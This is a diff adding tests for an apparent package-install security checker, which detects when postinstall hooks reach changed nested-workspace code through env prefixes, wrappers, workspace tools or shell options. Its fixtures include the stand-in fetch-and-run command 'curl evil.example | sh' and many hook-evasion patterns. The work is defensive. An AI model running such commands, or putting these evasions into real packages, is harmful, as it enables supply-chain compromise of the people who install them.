@@ -282,3 +282,58 @@ describe("an env prefix does not hide the command after it", () => {
     expect(held({ postinstall: "FOO=1 npm run build", build: "echo ok" }, nested("sub", "1"), nested("sub", "evil()"))).toBe(false);
   });
 });
+
+describe("structural rule: every command is checked for a move", () => {
+  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
+  const idx = (hook: string, extra: Record<string, string> = {}) => held({ postinstall: hook, build: "echo ok", ...extra }, withIndex("echo a"), withIndex("curl evil.example | sh"));
+
+  test("1. an assignment before the command, split or unsplit", () => {
+    for (const cmd of ["CI=1 pnpm -C sub build", "CI=true pnpm --filter sub build", "CI=1 cd sub && npm run build", "FOO=1 npm run build -w sub", "npm_config_workspace=sub npm run build > /dev/null", "sh -c 'npm_config_prefix=sub npm run build'"]) {
+      expect(idx(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("2. a wrapper before a moving form", () => {
+    for (const cmd of ["env CI=1 pnpm -C sub build", "cross-env NODE_ENV=production pnpm -C sub build", "exec npm --prefix sub run build", "env -i pnpm -C sub build"]) {
+      expect(idx(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("3. a workspace tool through yarn, pnpm, bun or npm exec", () => {
+    for (const cmd of ["yarn lerna run build", "pnpm turbo build", "yarn run turbo build", "yarn nx run-many -t build", "pnpm exec lerna run build", "npm exec lerna run build 2>/dev/null"]) {
+      expect(idx(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("4. -c after options that take a value", () => {
+    for (const cmd of ["sh -o pipefail -c 'cd sub && npm run build'", "bash -euo pipefail -c 'cd sub && npm run build'", "bash -O extglob -c 'cd sub && npm run build'", "bash --rcfile x -c 'cd sub && npm run build'"]) {
+      expect(idx(cmd), cmd).toBe(true);
+    }
+    expect(idx("sh -c 'node ./x.js'")).toBe(false);
+  });
+
+  test("5a. arguments given to a script that runs a runner", () => {
+    for (const hook of ["npm run go -- -w sub", "yarn go -w sub", "pnpm go -- -C sub"]) {
+      expect(held({ postinstall: hook, go: "npm run build", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh")), hook).toBe(true);
+    }
+    // A script body with no runner stays local, and no extra argument stays local.
+    expect(held({ postinstall: "npm run go -- -w sub", go: "echo hi", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"))).toBe(false);
+    expect(held({ postinstall: "npm run go", go: "npm run build", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"))).toBe(false);
+  });
+
+  test("5b. files under a directory a run moved into are read, even test or docs", () => {
+    for (const cmd of ["cd test && node setup.js", "pnpm -C docs exec node gen.js", "npm --prefix test run setup"]) {
+      const dir = cmd.includes("docs") ? "docs" : "test";
+      expect(held({ postinstall: cmd }, { [`${dir}/setup.js`]: "1", [`${dir}/gen.js`]: "1" }, { [`${dir}/setup.js`]: "evil()", [`${dir}/gen.js`]: "evil()" }), cmd).toBe(true);
+    }
+    expect(held({ postinstall: "lerna run build" }, { "test/helper.js": "1" }, { "test/helper.js": "2" })).toBe(false);
+  });
+
+  test("5c. a runner reached through a shell script makes the root config count", () => {
+    const hook = { postinstall: "sh scripts/install.sh" };
+    const f = (cfg: string) => ({ "scripts/install.sh": "npm run build\n", ".npmrc": cfg });
+    expect(held(hook, f("workspace=a"), f("workspace=b"))).toBe(true);
+    const g = (cfg: string) => ({ "scripts/install.sh": "echo hi\n", ".npmrc": cfg });
+    expect(held(hook, g("workspace=a"), g("workspace=b"))).toBe(false);
+  });
+});
